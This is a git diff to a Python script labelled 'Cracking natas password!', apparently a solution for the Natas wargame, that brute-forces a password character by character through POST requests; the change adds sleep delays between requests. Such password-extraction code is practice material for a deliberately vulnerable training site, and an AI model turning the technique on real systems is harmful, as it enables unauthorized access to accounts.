@@ -1,11 +1,14 @@
 """Cracking natas password!
 """
 
+# Standart library import
+from time import sleep
+
 # Third party import
 from requests import post
 
 # Local imports
-from variables import auth, URL, CHARS, NAME
+from variables import auth, URL, CHARS, NAME, STOP_TIME
 
 # Variables
 password = ""
@@ -34,6 +37,7 @@ def get_respones(character: str) -> str:
 
 
 for char in CHARS:
+    sleep(STOP_TIME)
     testing_respones = post(
         URL,
         data={
@@ -48,6 +52,7 @@ print(f"Currect characters: {filtered_characters}")
 
 for _ in range(32):
     for testing_character in filtered_characters:
+        sleep(STOP_TIME)
         current_char = get_respones(testing_character)
         if current_char:
             password += current_char
